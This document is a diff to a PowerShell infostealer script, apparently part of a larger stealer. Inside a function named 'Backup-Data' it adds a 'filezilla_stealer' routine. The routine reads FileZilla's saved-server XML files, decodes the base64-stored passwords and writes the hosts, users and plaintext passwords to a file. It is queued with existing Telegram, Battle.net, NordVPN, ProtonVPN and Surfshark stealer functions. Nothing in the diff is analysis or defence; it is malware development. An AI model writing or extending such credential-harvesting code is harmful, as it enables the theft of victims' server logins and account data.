@@ -253,8 +253,9 @@ function Backup-Data {
     $folder_email = "$folderformat\Email Clients"
     $important_files = "$folderformat\Important Files"
     $browser_data = "$folderformat\Browser Data"
+	$filezilla_bkp = "$folderformat\Filezilla"
 
-    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data)
+    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force
     }
@@ -640,7 +641,55 @@ function Backup-Data {
         New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
         Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
     }
+   
+    # FTP Clients 
+   
+    # Filezilla 
+    function filezilla_stealer {
+    $FileZillafolder = "$env:appdata\FileZilla"
+    if (!(Test-Path $FileZillafolder)) { return }
+    $filezilla_hosts = "$filezilla_bkp"
+    $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
+    $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
+	function ParseServerInfo {
+    param ([string]$xmlContent)
+    $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
+    $serverHost = $matches.Groups[1].Value
+    $serverPort = $matches.Groups[2].Value
+    $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
+    # Check if both User and Pass are blank
+    if ([string]::IsNullOrWhiteSpace($serverUser)) {
+        return @"
+Host: $serverHost
+Port: $serverPort
 
+"@
+    }
+    # If User is not blank, continue with authentication details
+    $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
+    $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
+    return @"
+Host: $serverHost
+Port: $serverPort
+User: $serverUser
+Pass: $decodedPass
+
+"@
+}
+    $serversInfo = @()
+    foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
+    if (Test-Path $xmlFile) {
+    $xmlContent = Get-Content -Path $xmlFile
+    $servers = [System.Collections.ArrayList]@()
+    $xmlContent | Select-String -Pattern "<Server>" -Context 0,10 | ForEach-Object {
+    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
+    $servers.Add($serverInfo) | Out-Null
+     }
+    $serversInfo += $servers -join "`n"
+        }
+    }
+    $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
+}
 
     function Export-Data_Sessions {        
         telegramstealer
@@ -659,7 +708,8 @@ function Backup-Data {
         battle_net_stealer
         nordvpnstealer
         protonvpnstealer
-        surfsharkvpnstealer        
+        surfsharkvpnstealer 
+        filezilla_stealer		
     }
     Export-Data_Sessions
 
